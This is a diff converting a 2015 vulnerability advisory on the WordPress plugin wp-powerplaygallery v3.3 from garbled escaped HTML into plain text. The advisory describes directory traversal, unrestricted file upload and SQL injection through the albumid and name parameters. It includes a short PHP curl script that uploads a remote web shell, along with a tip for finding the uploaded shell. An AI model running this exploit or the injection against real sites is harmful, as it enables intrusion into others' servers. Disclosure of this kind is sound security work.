@@ -1,61 +1,78 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 132&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file upload vulnerability &amp; Blind SQLi in wordpress plugin wp-powerplaygallery v3.3&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-06-27&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/wp-powerplaygallery">https://wordpress.org/plugins/wp-powerplaygallery</a>"&gt;<a href="https://wordpress.org/plugins/wp-powerplaygallery&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wp-powerplaygallery&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;WP SlideShow&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-06-29&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:plugins@wordpress.org">plugins@wordpress.org</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;This is the best gallery for touch screens. It is fully touch enabled with great features. This gallery is compatible wiht iphone and ipads. It is also allow us to use it as a widget.You can also enable this Powerplay Gallery on your wordpress site by placing code snippet in your template (.php) files. It shows flash gallery for desktops and touch enabled version for ipad and iphones.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;1. Ability to create directories out side of the upload path by using ../:
-Lines 56-59 of upload.php:
-</p><p>56 // Create target dir<br/>
-57 if (!file_exists($targetDir)) {<br/>
-58         @mkdir($targetDir);<br/>
-59 }      
-</p><p>2. Arbitrary file uploads to a path in the web root directory:
-Lines 138-160 of uploads.php don&amp;rsquo;t verify what types of files are allowed or where they should be placed:
-</p><p>138 // Open temp file<br/>
-139 if (!$out = @fopen(&amp;quot;{$filePath}.part&amp;quot;, $chunks ? &amp;quot;ab&amp;quot; : &amp;quot;wb&amp;quot;)) {
-140         die(&amp;#039;{&amp;quot;jsonrpc&amp;quot; : &amp;quot;2.0&amp;quot;, &amp;quot;error&amp;quot; : {&amp;quot;code&amp;quot;: 102, &amp;quot;message&amp;quot;: &amp;quot;Failed to open output stream.&amp;quot;}, &amp;quot;id&amp;quot; :     &amp;quot;id&amp;quot;}&amp;#039;);
-141 }<br/>
-142 <br/>
-143 if (!empty($_FILES)) {
-</p><pre>
-144         if ($<u>FILES[&amp;quot;file&amp;quot;][&amp;quot;error&amp;quot;] || !is</u>uploaded_file($<u>FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp</u>name&amp;quot;])) {
-145                 die(&amp;#039;{&amp;quot;jsonrpc&amp;quot; : &amp;quot;2.0&amp;quot;, &amp;quot;error&amp;quot; : {&amp;quot;code&amp;quot;: 103, &amp;quot;message&amp;quot;: &amp;quot;Failed to move uploaded file.&amp;quot;}    , &amp;quot;id&amp;quot; : &amp;quot;id&amp;quot;}&amp;#039;);
-146         }
-147 
-148         // Read binary input stream and append it to temp file
-149         if (!$in = @fopen($<u>FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp</u>name&amp;quot;], &amp;quot;rb&amp;quot;)) {
-150                 die(&amp;#039;{&amp;quot;jsonrpc&amp;quot; : &amp;quot;2.0&amp;quot;, &amp;quot;error&amp;quot; : {&amp;quot;code&amp;quot;: 101, &amp;quot;message&amp;quot;: &amp;quot;Failed to open input stream.&amp;quot;},     &amp;quot;id&amp;quot; : &amp;quot;id&amp;quot;}&amp;#039;);
-151         }
-152 } else {
-153         if (!$in = @fopen(&amp;quot;php://input&amp;quot;, &amp;quot;rb&amp;quot;)) {
-154                 die(&amp;#039;{&amp;quot;jsonrpc&amp;quot; : &amp;quot;2.0&amp;quot;, &amp;quot;error&amp;quot; : {&amp;quot;code&amp;quot;: 101, &amp;quot;message&amp;quot;: &amp;quot;Failed to open input stream.&amp;quot;},     &amp;quot;id&amp;quot; : &amp;quot;id&amp;quot;}&amp;#039;);
-155         }
-</pre>
-<p>156 }<br/>
-157 <br/>
-158 while ($buff = fread($in, 4096)) {<br/>
-159         fwrite($out, $buff);<br/>
-160 }
-</p><p>3. Sql injection <br/>
-Lines 131-135 of upload.php fail to handle user input appropriately either by sanitizing or paramaterizing it. Injection points are
-any GET/POST to albumid or name.
-</p><p>131 $query = &amp;quot;INSERT INTO &amp;quot;.$wpdb-&amp;gt;prefix.&amp;quot;pp_images (`category_id`, `title`, `description`, `price`, `thumb`, `    image`, `status`, `order`, `creation_date` )
-132           VALUES (&amp;quot;.$_REQUEST[&amp;#039;albumid&amp;#039;].&amp;quot;,&amp;#039;&amp;quot;.$imgname[0].&amp;quot;&amp;#039;,&amp;#039;&amp;quot;.$imgname[0].&amp;quot;&amp;#039;,&amp;#039;&amp;#039;,&amp;#039;&amp;quot;.$resize.&amp;quot;&amp;#039;,&amp;#039;&amp;quot;.$_REQUEST    [&amp;#039;name&amp;#039;].&amp;quot;&amp;#039;,1,&amp;#039;&amp;#039;,&amp;#039;NULL&amp;#039;)&amp;quot;;
-133 <br/>
-134           $wpdb-&amp;gt;query($query);<br/>
-135 <br/>
-&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-5599 2015-5681 2015-5682&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=132"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/*Remote shell upload exploit for wp-powerplaygallery v3.3 <em>/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/</em>Larry W. Cashdollar @<u>larry0&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;6/27/2015&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;albumid needs to be a numeric value matching an existing album number, 1 is probably a good start&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;but you can enumerate these by using curl, and looking for redirect 301 responses:&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;e.g. $ curl <a href="http://www.vapidlabs.com/wp-content/uploads/power</u>play/4_uploadfolder/big&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;-&amp;gt;301 exists else 404 doesn't.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;shell is <a href="http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;*/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt; &lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'<a href="http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php">http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php</a>'&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt; &lt;span style="color: #000088;"&gt;$file_name_with_full_path&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'/var/www/shell.php'&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;POST to &lt;span style="color: #006699; font-weight: bold;"&gt;$target_url&lt;/span&gt; &lt;span style="color: #006699; font-weight: bold;"&gt;$file_name_with_full_path&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt; &lt;span style="color: #000088;"&gt;$post&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/array">http://www.php.net/array</a>"&gt;&lt;span style="color: #990000;"&gt;array&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'albumid'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'foo'&lt;/span&gt; &lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'name'&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'shell.php'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'file'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'@'&lt;/span&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;span style="color: #000088;"&gt;$file_name_with_full_path&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #000088;"&gt;$ch&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/curl_init">http://www.php.net/curl_init</a>"&gt;&lt;span style="color: #990000;"&gt;curl_init&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;    &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_URL&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt; &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POST&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POSTFIELDS&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #000088;"&gt;$post&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_RETURNTRANSFER&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #000088;"&gt;$result&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;a href="<a href="http://www.php.net/curl_exec">http://www.php.net/curl_exec</a>"&gt;&lt;span style="color: #990000;"&gt;curl_exec&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;    &lt;a href="<a href="http://www.php.net/curl_close">http://www.php.net/curl_close</a>"&gt;&lt;span style="color: #990000;"&gt;curl_close&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;&amp;lt;hr&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;       &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #000088;"&gt;$result&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;&amp;lt;hr&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;?&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=132">http://www.vapid.dhs.org/advisory.php?v=132</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=132&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=132&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                 Advisory #: 132
+Title: Remote file upload vulnerability & Blind SQLi in wordpress plugin wp-
+powerplaygallery v3.3
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-06-27
+Download Site: https://wordpress.org/plugins/wp-powerplaygallery
+Vendor:WP SlideShow
+Vendor Notified: 2015-06-29
+Vendor Contact: plugins@wordpress.org
+Description: This is the best gallery for touch screens. It is fully touch
+enabled with great features. This gallery is compatible wiht iphone and ipads. It
+is also allow us to use it as a widget.You can also enable this Powerplay Gallery
+on your wordpress site by placing code snippet in your template (.php) files. It
+shows flash gallery for desktops and touch enabled version for ipad and iphones.
+Vulnerability:
+1. Ability to create directories out side of the upload path by using ../: Lines
+56-59 of upload.php: 56 // Create target dir 57 if (!file_exists($targetDir))
+{ 58 @mkdir($targetDir); 59 } 2. Arbitrary file uploads to a path in the web root
+directory: Lines 138-160 of uploads.php don’t verify what types of files are
+allowed or where they should be placed: 138 // Open temp file 139 if (!$out =
+@fopen("{$filePath}.part", $chunks ? "ab" : "wb")) { 140 die('{"jsonrpc" : "2.0",
+"error" : {"code": 102, "message": "Failed to open output stream."}, "id" :
+"id"}'); 141 } 142 143 if (!empty($_FILES)) { 144 if ($_FILES["file"]["error"] ||
+!is_uploaded_file($_FILES["file"]["tmp_name"])) { 145 die('{"jsonrpc" : "2.0",
+"error" : {"code": 103, "message": "Failed to move uploaded file."} , "id" :
+"id"}'); 146 } 147 148 // Read binary input stream and append it to temp file 149
+if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) { 150 die('{"jsonrpc" :
+"2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" :
+"id"}'); 151 } 152 } else { 153 if (!$in = @fopen("php://input", "rb")) { 154 die
+('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input
+stream."}, "id" : "id"}'); 155 } 156 } 157 158 while ($buff = fread($in, 4096))
+{ 159 fwrite($out, $buff); 160 } 3. Sql injection Lines 131-135 of upload.php
+fail to handle user input appropriately either by sanitizing or paramaterizing
+it. Injection points are any GET/POST to albumid or name. 131 $query = "INSERT
+INTO ".$wpdb->prefix."pp_images (`category_id`, `title`, `description`, `price`,
+`thumb`, ` image`, `status`, `order`, `creation_date` ) 132 VALUES (".$_REQUEST
+['albumid'].",'".$imgname[0]."','".$imgname[0]."','','".$resize."','".$_REQUEST
+['name']."',1,'','NULL')"; 133 134 $wpdb->query($query); 135
+CVE-2015-5599 2015-5681 2015-5682
+JSON:Export
+Exploit Code:
+   1. <?php
+   2. /*Remote shell upload exploit for wp-powerplaygallery v3.3 */
+   3. /*Larry W. Cashdollar @_larry0
+   4. 6/27/2015
+   5. albumid needs to be a numeric value matching an existing album number, 1 is
+      probably a good start
+   6. but you can enumerate these by using curl, and looking for redirect 301
+      responses:
+   7. e.g. $ curl http://www.vapidlabs.com/wp-content/uploads/power_play/
+      4_uploadfolder/big
+   8. ->301 exists else 404 doesn't.
+   9. shell is http://www.vapidlabs.com/wp-content/uploads/power_play/
+      4_uploadfolder/big/shell.php
+  10. */
+  11.  
+  12.  
+  13. $target_url = 'http://www.vapidlabs.com/wp-content/plugins/wp-
+      powerplaygallery/upload.php';
+  14. $file_name_with_full_path = '/var/www/shell.php';
+  15.  
+  16.         echo "POST to $target_url $file_name_with_full_path";
+  17. $post = array('albumid'=>'foo' , 'name' =>
+      'shell.php','file'=>'@'.$file_name_with_full_path);
+  18.  
+  19.         $ch = curl_init();
+  20. curl_setopt($ch, CURLOPT_URL,$target_url);
+  21. curl_setopt($ch, CURLOPT_POST,1);
+  22. curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+  23.         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+  24. $result=curl_exec ($ch);
+  25. curl_close ($ch);
+  26.         echo "<hr>";
+  27. echo $result;
+  28.         echo "<hr>";
+  29. ?>
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisory.php?v=132
